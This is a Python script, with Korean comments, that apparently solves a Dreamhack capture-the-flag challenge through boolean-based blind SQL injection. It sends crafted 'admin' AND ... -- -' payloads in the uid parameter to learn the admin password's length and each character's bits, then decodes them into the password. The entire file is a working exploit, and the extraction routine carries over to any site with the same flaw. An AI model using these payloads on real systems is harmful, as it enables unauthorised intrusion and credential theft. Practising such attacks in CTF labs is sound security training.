import requests
import sys


if __name__ == '__main__':
    chall_port = int(sys.argv[1])
    host = f"http://host3.dreamhack.games:{chall_port}"
    # host = "http://localhost:5000"

    # 1. 패스워드 길이 찾기
    pw_len = 0
    while True:
        pw_len += 1
        query = f"admin' AND char_length(upw)={pw_len}-- -"
        r = requests.get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"password length: {pw_len}")

    # 2. 각 문자별 비트열 길이 찾기
    password = ""
    for i in range(1, pw_len + 1):
        bit_len = 0
        while True:
            bit_len += 1
            query = f"admin' AND length(bin(ord(substr(upw, {i}, 1)))) = {bit_len}-- -"
            r = requests.get(f"{host}/?uid={query}")
            if "exists" in r.text:
                break
        print(f"character {i}'s bit length: {bit_len}")

    # 3. 각 문자 별 비트열 추출
        bits = ""
        for j in range(1, bit_len + 1):
            query = f"admin' AND substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1' -- -"
            r = requests.get(f"{host}/?uid={query}")
            if "exists" in r.text:
                bits += "1"
            else:
                bits += "0"

        print(f"character {i}'s bits: {bits}")

    # 4. 비트열을 문자로 변환
    # ex) '가'를 utf-8로 인코딩하면 \xea\xb0\x80이고 이를 비트열로 표현하면 111010101011000010000000
    # - 비트열을 정수로 변환(int 클래스)
    # - 정수를 Big Endian 형태의 문자로 변환(int.to_bytes 함수)
    # - 변환된 문자를 인코딩에 맞게 변환(bytes.decode)

        # bits가 2진수라는 것 알려줌, 비트가 몇 바이트인지 변환
        password += int.to_bytes(int(bits, 2), (bit_len + 7) // 8, "big").decode("utf-8")

    print(password)
